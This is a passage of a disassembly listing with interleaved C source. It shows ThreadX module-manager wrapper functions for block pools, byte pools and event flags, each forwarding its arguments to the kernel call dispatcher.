/**************************************************************************/
UINT _txe_block_pool_prioritize(TX_BLOCK_POOL *pool_ptr)
{
 80203ec:	b590      	push	{r4, r7, lr}
 80203ee:	b085      	sub	sp, #20
 80203f0:	af00      	add	r7, sp, #0
 80203f2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PRIORITIZE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 80203f4:	4b07      	ldr	r3, [pc, #28]	; (8020414 <_txe_block_pool_prioritize+0x28>)
 80203f6:	f859 3003 	ldr.w	r3, [r9, r3]
 80203fa:	681c      	ldr	r4, [r3, #0]
 80203fc:	6879      	ldr	r1, [r7, #4]
 80203fe:	2300      	movs	r3, #0
 8020400:	2200      	movs	r2, #0
 8020402:	2007      	movs	r0, #7
 8020404:	47a0      	blx	r4
 8020406:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020408:	68fb      	ldr	r3, [r7, #12]
}
 802040a:	4618      	mov	r0, r3
 802040c:	3714      	adds	r7, #20
 802040e:	46bd      	mov	sp, r7
 8020410:	bd90      	pop	{r4, r7, pc}
 8020412:	bf00      	nop
 8020414:	00000004 	.word	0x00000004

08020418 <_txe_block_release>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_release(VOID *block_ptr)
{
 8020418:	b590      	push	{r4, r7, lr}
 802041a:	b085      	sub	sp, #20
 802041c:	af00      	add	r7, sp, #0
 802041e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_RELEASE_CALL, (ALIGN_TYPE) block_ptr, 0, 0);
 8020420:	4b07      	ldr	r3, [pc, #28]	; (8020440 <_txe_block_release+0x28>)
 8020422:	f859 3003 	ldr.w	r3, [r9, r3]
 8020426:	681c      	ldr	r4, [r3, #0]
 8020428:	6879      	ldr	r1, [r7, #4]
 802042a:	2300      	movs	r3, #0
 802042c:	2200      	movs	r2, #0
 802042e:	2008      	movs	r0, #8
 8020430:	47a0      	blx	r4
 8020432:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020434:	68fb      	ldr	r3, [r7, #12]
}
 8020436:	4618      	mov	r0, r3
 8020438:	3714      	adds	r7, #20
 802043a:	46bd      	mov	sp, r7
 802043c:	bd90      	pop	{r4, r7, pc}
 802043e:	bf00      	nop
 8020440:	00000004 	.word	0x00000004

08020444 <_txe_byte_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_allocate(TX_BYTE_POOL *pool_ptr, VOID **memory_ptr, ULONG memory_size, ULONG wait_option)
{
 8020444:	b590      	push	{r4, r7, lr}
 8020446:	b089      	sub	sp, #36	; 0x24
 8020448:	af00      	add	r7, sp, #0
 802044a:	60f8      	str	r0, [r7, #12]
 802044c:	60b9      	str	r1, [r7, #8]
 802044e:	607a      	str	r2, [r7, #4]
 8020450:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) memory_size;
 8020452:	687b      	ldr	r3, [r7, #4]
 8020454:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) wait_option;
 8020456:	683b      	ldr	r3, [r7, #0]
 8020458:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_ALLOCATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) memory_ptr, (ALIGN_TYPE) extra_parameters);
 802045a:	4b08      	ldr	r3, [pc, #32]	; (802047c <_txe_byte_allocate+0x38>)
 802045c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020460:	681c      	ldr	r4, [r3, #0]
 8020462:	68f9      	ldr	r1, [r7, #12]
 8020464:	68ba      	ldr	r2, [r7, #8]
 8020466:	f107 0314 	add.w	r3, r7, #20
 802046a:	2009      	movs	r0, #9
 802046c:	47a0      	blx	r4
 802046e:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020470:	69fb      	ldr	r3, [r7, #28]
}
 8020472:	4618      	mov	r0, r3
 8020474:	3724      	adds	r7, #36	; 0x24
 8020476:	46bd      	mov	sp, r7
 8020478:	bd90      	pop	{r4, r7, pc}
 802047a:	bf00      	nop
 802047c:	00000004 	.word	0x00000004

08020480 <_txe_byte_pool_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_create(TX_BYTE_POOL *pool_ptr, CHAR *name_ptr, VOID *pool_start, ULONG pool_size, UINT pool_control_block_size)
{
 8020480:	b590      	push	{r4, r7, lr}
 8020482:	b089      	sub	sp, #36	; 0x24
 8020484:	af00      	add	r7, sp, #0
 8020486:	60f8      	str	r0, [r7, #12]
 8020488:	60b9      	str	r1, [r7, #8]
 802048a:	607a      	str	r2, [r7, #4]
 802048c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) pool_start;
 802048e:	687b      	ldr	r3, [r7, #4]
 8020490:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) pool_size;
 8020492:	683b      	ldr	r3, [r7, #0]
 8020494:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) pool_control_block_size;
 8020496:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020498:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_CREATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 802049a:	4b08      	ldr	r3, [pc, #32]	; (80204bc <_txe_byte_pool_create+0x3c>)
 802049c:	f859 3003 	ldr.w	r3, [r9, r3]
 80204a0:	681c      	ldr	r4, [r3, #0]
 80204a2:	68f9      	ldr	r1, [r7, #12]
 80204a4:	68ba      	ldr	r2, [r7, #8]
 80204a6:	f107 0310 	add.w	r3, r7, #16
 80204aa:	200a      	movs	r0, #10
 80204ac:	47a0      	blx	r4
 80204ae:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80204b0:	69fb      	ldr	r3, [r7, #28]
}
 80204b2:	4618      	mov	r0, r3
 80204b4:	3724      	adds	r7, #36	; 0x24
 80204b6:	46bd      	mov	sp, r7
 80204b8:	bd90      	pop	{r4, r7, pc}
 80204ba:	bf00      	nop
 80204bc:	00000004 	.word	0x00000004

080204c0 <_txe_byte_pool_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_delete(TX_BYTE_POOL *pool_ptr)
{
 80204c0:	b590      	push	{r4, r7, lr}
 80204c2:	b085      	sub	sp, #20
 80204c4:	af00      	add	r7, sp, #0
 80204c6:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_DELETE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 80204c8:	4b07      	ldr	r3, [pc, #28]	; (80204e8 <_txe_byte_pool_delete+0x28>)
 80204ca:	f859 3003 	ldr.w	r3, [r9, r3]
 80204ce:	681c      	ldr	r4, [r3, #0]
 80204d0:	6879      	ldr	r1, [r7, #4]
 80204d2:	2300      	movs	r3, #0
 80204d4:	2200      	movs	r2, #0
 80204d6:	200b      	movs	r0, #11
 80204d8:	47a0      	blx	r4
 80204da:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80204dc:	68fb      	ldr	r3, [r7, #12]
}
 80204de:	4618      	mov	r0, r3
 80204e0:	3714      	adds	r7, #20
 80204e2:	46bd      	mov	sp, r7
 80204e4:	bd90      	pop	{r4, r7, pc}
 80204e6:	bf00      	nop
 80204e8:	00000004 	.word	0x00000004

080204ec <_txe_byte_pool_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_info_get(TX_BYTE_POOL *pool_ptr, CHAR **name, ULONG *available_bytes, ULONG *fragments, TX_THREAD **first_suspended, ULONG *suspended_count, TX_BYTE_POOL **next_pool)
{
 80204ec:	b590      	push	{r4, r7, lr}
 80204ee:	b08b      	sub	sp, #44	; 0x2c
 80204f0:	af00      	add	r7, sp, #0
 80204f2:	60f8      	str	r0, [r7, #12]
 80204f4:	60b9      	str	r1, [r7, #8]
 80204f6:	607a      	str	r2, [r7, #4]
 80204f8:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) available_bytes;
 80204fa:	687b      	ldr	r3, [r7, #4]
 80204fc:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) fragments;
 80204fe:	683b      	ldr	r3, [r7, #0]
 8020500:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020502:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020504:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 8020506:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020508:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_pool;
 802050a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 802050c:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 802050e:	4b08      	ldr	r3, [pc, #32]	; (8020530 <_txe_byte_pool_info_get+0x44>)
 8020510:	f859 3003 	ldr.w	r3, [r9, r3]
 8020514:	681c      	ldr	r4, [r3, #0]
 8020516:	68f9      	ldr	r1, [r7, #12]
 8020518:	68ba      	ldr	r2, [r7, #8]
 802051a:	f107 0310 	add.w	r3, r7, #16
 802051e:	200c      	movs	r0, #12
 8020520:	47a0      	blx	r4
 8020522:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020524:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020526:	4618      	mov	r0, r3
 8020528:	372c      	adds	r7, #44	; 0x2c
 802052a:	46bd      	mov	sp, r7
 802052c:	bd90      	pop	{r4, r7, pc}
 802052e:	bf00      	nop
 8020530:	00000004 	.word	0x00000004

08020534 <_tx_byte_pool_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_byte_pool_performance_info_get(TX_BYTE_POOL *pool_ptr, ULONG *allocates, ULONG *releases, ULONG *fragments_searched, ULONG *merges, ULONG *splits, ULONG *suspensions, ULONG *timeouts)
{
 8020534:	b590      	push	{r4, r7, lr}
 8020536:	b08d      	sub	sp, #52	; 0x34
 8020538:	af00      	add	r7, sp, #0
 802053a:	60f8      	str	r0, [r7, #12]
 802053c:	60b9      	str	r1, [r7, #8]
 802053e:	607a      	str	r2, [r7, #4]
 8020540:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[6];

    extra_parameters[0] = (ALIGN_TYPE) releases;
 8020542:	687b      	ldr	r3, [r7, #4]
 8020544:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) fragments_searched;
 8020546:	683b      	ldr	r3, [r7, #0]
 8020548:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) merges;
 802054a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 802054c:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) splits;
 802054e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8020550:	623b      	str	r3, [r7, #32]
    extra_parameters[4] = (ALIGN_TYPE) suspensions;
 8020552:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8020554:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[5] = (ALIGN_TYPE) timeouts;
 8020556:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8020558:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) allocates, (ALIGN_TYPE) extra_parameters);
 802055a:	4b08      	ldr	r3, [pc, #32]	; (802057c <_tx_byte_pool_performance_info_get+0x48>)
 802055c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020560:	681c      	ldr	r4, [r3, #0]
 8020562:	68f9      	ldr	r1, [r7, #12]
 8020564:	68ba      	ldr	r2, [r7, #8]
 8020566:	f107 0314 	add.w	r3, r7, #20
 802056a:	200d      	movs	r0, #13
 802056c:	47a0      	blx	r4
 802056e:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 8020570:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 8020572:	4618      	mov	r0, r3
 8020574:	3734      	adds	r7, #52	; 0x34
 8020576:	46bd      	mov	sp, r7
 8020578:	bd90      	pop	{r4, r7, pc}
 802057a:	bf00      	nop
 802057c:	00000004 	.word	0x00000004

08020580 <_tx_byte_pool_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_byte_pool_performance_system_info_get(ULONG *allocates, ULONG *releases, ULONG *fragments_searched, ULONG *merges, ULONG *splits, ULONG *suspensions, ULONG *timeouts)
{
 8020580:	b590      	push	{r4, r7, lr}
 8020582:	b08b      	sub	sp, #44	; 0x2c
 8020584:	af00      	add	r7, sp, #0
 8020586:	60f8      	str	r0, [r7, #12]
 8020588:	60b9      	str	r1, [r7, #8]
 802058a:	607a      	str	r2, [r7, #4]
 802058c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) fragments_searched;
 802058e:	687b      	ldr	r3, [r7, #4]
 8020590:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) merges;
 8020592:	683b      	ldr	r3, [r7, #0]
 8020594:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) splits;
 8020596:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020598:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspensions;
 802059a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 802059c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) timeouts;
 802059e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80205a0:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) allocates, (ALIGN_TYPE) releases, (ALIGN_TYPE) extra_parameters);
 80205a2:	4b08      	ldr	r3, [pc, #32]	; (80205c4 <_tx_byte_pool_performance_system_info_get+0x44>)
 80205a4:	f859 3003 	ldr.w	r3, [r9, r3]
 80205a8:	681c      	ldr	r4, [r3, #0]
 80205aa:	68f9      	ldr	r1, [r7, #12]
 80205ac:	68ba      	ldr	r2, [r7, #8]
 80205ae:	f107 0310 	add.w	r3, r7, #16
 80205b2:	200e      	movs	r0, #14
 80205b4:	47a0      	blx	r4
 80205b6:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80205b8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80205ba:	4618      	mov	r0, r3
 80205bc:	372c      	adds	r7, #44	; 0x2c
 80205be:	46bd      	mov	sp, r7
 80205c0:	bd90      	pop	{r4, r7, pc}
 80205c2:	bf00      	nop
 80205c4:	00000004 	.word	0x00000004

080205c8 <_txe_byte_pool_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_prioritize(TX_BYTE_POOL *pool_ptr)
{
 80205c8:	b590      	push	{r4, r7, lr}
 80205ca:	b085      	sub	sp, #20
 80205cc:	af00      	add	r7, sp, #0
 80205ce:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PRIORITIZE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 80205d0:	4b07      	ldr	r3, [pc, #28]	; (80205f0 <_txe_byte_pool_prioritize+0x28>)
 80205d2:	f859 3003 	ldr.w	r3, [r9, r3]
 80205d6:	681c      	ldr	r4, [r3, #0]
 80205d8:	6879      	ldr	r1, [r7, #4]
 80205da:	2300      	movs	r3, #0
 80205dc:	2200      	movs	r2, #0
 80205de:	200f      	movs	r0, #15
 80205e0:	47a0      	blx	r4
 80205e2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80205e4:	68fb      	ldr	r3, [r7, #12]
}
 80205e6:	4618      	mov	r0, r3
 80205e8:	3714      	adds	r7, #20
 80205ea:	46bd      	mov	sp, r7
 80205ec:	bd90      	pop	{r4, r7, pc}
 80205ee:	bf00      	nop
 80205f0:	00000004 	.word	0x00000004

080205f4 <_txe_byte_release>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_release(VOID *memory_ptr)
{
 80205f4:	b590      	push	{r4, r7, lr}
 80205f6:	b085      	sub	sp, #20
 80205f8:	af00      	add	r7, sp, #0
 80205fa:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_RELEASE_CALL, (ALIGN_TYPE) memory_ptr, 0, 0);
 80205fc:	4b07      	ldr	r3, [pc, #28]	; (802061c <_txe_byte_release+0x28>)
 80205fe:	f859 3003 	ldr.w	r3, [r9, r3]
 8020602:	681c      	ldr	r4, [r3, #0]
 8020604:	6879      	ldr	r1, [r7, #4]
 8020606:	2300      	movs	r3, #0
 8020608:	2200      	movs	r2, #0
 802060a:	2010      	movs	r0, #16
 802060c:	47a0      	blx	r4
 802060e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020610:	68fb      	ldr	r3, [r7, #12]
}
 8020612:	4618      	mov	r0, r3
 8020614:	3714      	adds	r7, #20
 8020616:	46bd      	mov	sp, r7
 8020618:	bd90      	pop	{r4, r7, pc}
 802061a:	bf00      	nop
 802061c:	00000004 	.word	0x00000004

08020620 <_txe_event_flags_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_create(TX_EVENT_FLAGS_GROUP *group_ptr, CHAR *name_ptr, UINT event_control_block_size)
{
 8020620:	b590      	push	{r4, r7, lr}
 8020622:	b087      	sub	sp, #28
 8020624:	af00      	add	r7, sp, #0
 8020626:	60f8      	str	r0, [r7, #12]
 8020628:	60b9      	str	r1, [r7, #8]
 802062a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_CREATE_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) event_control_block_size);
 802062c:	4b07      	ldr	r3, [pc, #28]	; (802064c <_txe_event_flags_create+0x2c>)
 802062e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020632:	681c      	ldr	r4, [r3, #0]
 8020634:	68f9      	ldr	r1, [r7, #12]
 8020636:	68ba      	ldr	r2, [r7, #8]
 8020638:	687b      	ldr	r3, [r7, #4]
 802063a:	2011      	movs	r0, #17
 802063c:	47a0      	blx	r4
 802063e:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020640:	697b      	ldr	r3, [r7, #20]
}
 8020642:	4618      	mov	r0, r3
 8020644:	371c      	adds	r7, #28
 8020646:	46bd      	mov	sp, r7
 8020648:	bd90      	pop	{r4, r7, pc}
 802064a:	bf00      	nop
 802064c:	00000004 	.word	0x00000004

08020650 <_txe_event_flags_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_delete(TX_EVENT_FLAGS_GROUP *group_ptr)
{
 8020650:	b590      	push	{r4, r7, lr}
 8020652:	b085      	sub	sp, #20
 8020654:	af00      	add	r7, sp, #0
 8020656:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_DELETE_CALL, (ALIGN_TYPE) group_ptr, 0, 0);
 8020658:	4b07      	ldr	r3, [pc, #28]	; (8020678 <_txe_event_flags_delete+0x28>)
 802065a:	f859 3003 	ldr.w	r3, [r9, r3]
 802065e:	681c      	ldr	r4, [r3, #0]
 8020660:	6879      	ldr	r1, [r7, #4]
 8020662:	2300      	movs	r3, #0
 8020664:	2200      	movs	r2, #0
 8020666:	2012      	movs	r0, #18
 8020668:	47a0      	blx	r4
 802066a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802066c:	68fb      	ldr	r3, [r7, #12]
}
 802066e:	4618      	mov	r0, r3
 8020670:	3714      	adds	r7, #20
 8020672:	46bd      	mov	sp, r7
 8020674:	bd90      	pop	{r4, r7, pc}
 8020676:	bf00      	nop
 8020678:	00000004 	.word	0x00000004

0802067c <_txe_event_flags_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_get(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG requested_flags, UINT get_option, ULONG *actual_flags_ptr, ULONG wait_option)
{
 802067c:	b590      	push	{r4, r7, lr}
 802067e:	b089      	sub	sp, #36	; 0x24
 8020680:	af00      	add	r7, sp, #0
 8020682:	60f8      	str	r0, [r7, #12]
 8020684:	60b9      	str	r1, [r7, #8]
 8020686:	607a      	str	r2, [r7, #4]
 8020688:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) get_option;
 802068a:	687b      	ldr	r3, [r7, #4]
 802068c:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) actual_flags_ptr;
 802068e:	683b      	ldr	r3, [r7, #0]
 8020690:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) wait_option;
 8020692:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020694:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) requested_flags, (ALIGN_TYPE) extra_parameters);
 8020696:	4b08      	ldr	r3, [pc, #32]	; (80206b8 <_txe_event_flags_get+0x3c>)
 8020698:	f859 3003 	ldr.w	r3, [r9, r3]
 802069c:	681c      	ldr	r4, [r3, #0]
 802069e:	68f9      	ldr	r1, [r7, #12]
 80206a0:	f107 0310 	add.w	r3, r7, #16
 80206a4:	68ba      	ldr	r2, [r7, #8]
 80206a6:	2013      	movs	r0, #19
 80206a8:	47a0      	blx	r4
 80206aa:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80206ac:	69fb      	ldr	r3, [r7, #28]
}
 80206ae:	4618      	mov	r0, r3
 80206b0:	3724      	adds	r7, #36	; 0x24
 80206b2:	46bd      	mov	sp, r7
 80206b4:	bd90      	pop	{r4, r7, pc}
 80206b6:	bf00      	nop
 80206b8:	00000004 	.word	0x00000004

080206bc <_txe_event_flags_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_info_get(TX_EVENT_FLAGS_GROUP *group_ptr, CHAR **name, ULONG *current_flags, TX_THREAD **first_suspended, ULONG *suspended_count, TX_EVENT_FLAGS_GROUP **next_group)
{
 80206bc:	b590      	push	{r4, r7, lr}
 80206be:	b08b      	sub	sp, #44	; 0x2c
 80206c0:	af00      	add	r7, sp, #0
 80206c2:	60f8      	str	r0, [r7, #12]
 80206c4:	60b9      	str	r1, [r7, #8]
 80206c6:	607a      	str	r2, [r7, #4]
 80206c8:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) current_flags;
 80206ca:	687b      	ldr	r3, [r7, #4]
 80206cc:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) first_suspended;
 80206ce:	683b      	ldr	r3, [r7, #0]
 80206d0:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) suspended_count;
 80206d2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80206d4:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_group;
 80206d6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80206d8:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_INFO_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 80206da:	4b08      	ldr	r3, [pc, #32]	; (80206fc <_txe_event_flags_info_get+0x40>)
 80206dc:	f859 3003 	ldr.w	r3, [r9, r3]
 80206e0:	681c      	ldr	r4, [r3, #0]
 80206e2:	68f9      	ldr	r1, [r7, #12]
 80206e4:	68ba      	ldr	r2, [r7, #8]
 80206e6:	f107 0314 	add.w	r3, r7, #20
 80206ea:	2014      	movs	r0, #20
 80206ec:	47a0      	blx	r4
 80206ee:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80206f0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80206f2:	4618      	mov	r0, r3
 80206f4:	372c      	adds	r7, #44	; 0x2c
 80206f6:	46bd      	mov	sp, r7
 80206f8:	bd90      	pop	{r4, r7, pc}
 80206fa:	bf00      	nop
 80206fc:	00000004 	.word	0x00000004

08020700 <_tx_event_flags_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_event_flags_performance_info_get(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG *sets, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020700:	b590      	push	{r4, r7, lr}
 8020702:	b089      	sub	sp, #36	; 0x24
 8020704:	af00      	add	r7, sp, #0
 8020706:	60f8      	str	r0, [r7, #12]
 8020708:	60b9      	str	r1, [r7, #8]
 802070a:	607a      	str	r2, [r7, #4]
 802070c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 802070e:	687b      	ldr	r3, [r7, #4]
 8020710:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 8020712:	683b      	ldr	r3, [r7, #0]
 8020714:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 8020716:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020718:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) sets, (ALIGN_TYPE) extra_parameters);
 802071a:	4b08      	ldr	r3, [pc, #32]	; (802073c <_tx_event_flags_performance_info_get+0x3c>)
 802071c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020720:	681c      	ldr	r4, [r3, #0]
 8020722:	68f9      	ldr	r1, [r7, #12]
 8020724:	68ba      	ldr	r2, [r7, #8]
 8020726:	f107 0310 	add.w	r3, r7, #16
 802072a:	2015      	movs	r0, #21
 802072c:	47a0      	blx	r4
 802072e:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020730:	69fb      	ldr	r3, [r7, #28]
}
 8020732:	4618      	mov	r0, r3
 8020734:	3724      	adds	r7, #36	; 0x24
 8020736:	46bd      	mov	sp, r7
 8020738:	bd90      	pop	{r4, r7, pc}
 802073a:	bf00      	nop
 802073c:	00000004 	.word	0x00000004

08020740 <_tx_event_flags_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
